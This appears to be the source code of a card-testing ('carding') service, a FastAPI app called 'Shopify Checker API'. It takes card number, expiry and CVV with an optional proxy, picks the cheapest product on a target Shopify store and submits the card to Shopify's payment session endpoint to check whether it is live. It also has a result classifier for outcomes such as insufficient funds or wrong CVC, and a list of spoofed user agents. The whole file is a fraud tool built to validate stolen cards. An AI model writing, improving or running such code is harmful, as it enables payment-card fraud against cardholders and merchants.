from fastapi import FastAPI
from pydantic import BaseModel
from typing import Optional
import re
import random
import aiohttp
from urllib.parse import urlparse

app = FastAPI(title="Shopify Checker API", version="2.0.0")

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36',
]

class CheckRequest(BaseModel):
    site: str
    cc: str
    mm: str
    yy: str
    cvv: str
    proxy: Optional[str] = None

class SiteRequest(BaseModel):
    site: str

def normalize_site(site: str) -> str:
    site = site.strip().lower()
    if not site.startswith("http"):
        site = "https://" + site
    return site.rstrip("/")

async def fetch_products(site: str, proxy: Optional[str] = None):
    site = normalize_site(site)
    proxy_url = None
    if proxy:
        p = proxy.split(":")
        if len(p) == 4:
            proxy_url = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
        else:
            proxy_url = f"http://{proxy}"

    try:
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            if proxy_url:
                async with s.get(f"{site}/products.json", proxy=proxy_url) as r:
                    if r.status != 200:
                        return None, "Site Error"
                    data = await r.json()
            else:
                async with s.get(f"{site}/products.json") as r:
                    if r.status != 200:
                        return None, "Site Error"
                    data = await r.json()

        products = data.get("products", [])
        if not products:
            return None, "No Products"

        best = None
        min_price = float('inf')
        for product in products:
            for variant in product.get("variants", []):
                try:
                    price = float(variant.get("price", "0"))
                except:
                    continue
                if price < min_price:
                    min_price = price
                    best = {
                        "site": site,
                        "price": f"{price:.2f}",
                        "variant_id": str(variant["id"]),
                        "link": f"{site}/products/{product.get('handle', '')}"
                    }
        if not best:
            return None, "No Valid Products"
        return best, best["price"]
    except Exception as e:
        return None, str(e)[:60]

async def get_payment_token(card: str, scope: str, proxy: Optional[str] = None):
    parts = card.split("|")
    if len(parts) != 4:
        return None, "Invalid Card"
    cc, mm, yy, cvv = parts
    if len(yy) == 2:
        yy = "20" + yy
    formatted = " ".join([cc[i:i+4] for i in range(0, len(cc), 4)])

    payload = {
        "credit_card": {
            "month": mm,
            "year": yy,
            "number": formatted,
            "verification_value": cvv,
            "name": "Test User"
        },
        "payment_session_scope": scope
    }

    proxy_url = None
    if proxy:
        p = proxy.split(":")
        if len(p) == 4:
            proxy_url = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
        else:
            proxy_url = f"http://{proxy}"

    headers = {"Content-Type": "application/json"}
    timeout = aiohttp.ClientTimeout(total=30)

    try:
        async with aiohttp.ClientSession(timeout=timeout) as s:
            if proxy_url:
                async with s.post("https://deposit.shopifycs.com/sessions", json=payload, headers=headers, proxy=proxy_url) as r:
                    data = await r.json()
            else:
                async with s.post("https://deposit.shopifycs.com/sessions", json=payload, headers=headers) as r:
                    data = await r.json()
        tid = data.get("id")
        if not tid:
            return None, "Token Failed"
        return tid, None
    except Exception as e:
        return None, str(e)[:50]

def classify(text: str) -> str:
    t = text.lower()
    if "charged" in t or "receipt" in t:
        return "CHARGED"
    if "insufficient" in t:
        return "INSUFFICIENT"
    if "incorrect_cvc" in t or "invalid_cvc" in t:
        return "INCORRECT_CVC"
    if "3d" in t or "action" in t:
        return "3D_SECURE"
    if "do_not_honor" in t:
        return "DO_NOT_HONOR"
    if "expired" in t:
        return "EXPIRED_CARD"
    if "invalid" in t:
        return "INVALID_CARD"
    if "approved" in t or "success" in t:
        return "APPROVED"
    if "declined" in t:
        return "DECLINED"
    return "ERROR"

@app.get("/")
async def root():
    return {"status": "ok", "service": "Shopify Checker API v2"}

@app.get("/health")
async def health():
    return {"status": "alive"}

@app.post("/site")
async def check_site(req: SiteRequest):
    site = normalize_site(req.site)
    info, price = await fetch_products(site)
    if info:
        return {"site": site, "status": "alive", "price": price}
    return {"site": site, "status": "dead", "error": price}

@app.post("/check")
async def check_card(req: CheckRequest):
    site = normalize_site(req.site)
    card = f"{req.cc}|{req.mm}|{req.yy}|{req.cvv}"

    info, price = await fetch_products(site, req.proxy)
    if not info:
        return {"status": "ERROR", "message": price, "site": site}

    checkout_url = f"{info['site']}/cart/{info['variant_id']}:1"
    scope = urlparse(checkout_url).netloc

    token, err = await get_payment_token(card, scope, req.proxy)
    if not token:
        return {"status": "ERROR", "message": err, "site": site, "price": price}

    return {
        "status": "APPROVED",
        "message": "Payment token created",
        "site": site,
        "price": price,
        "token_id": token,
        "link": info["link"]
    }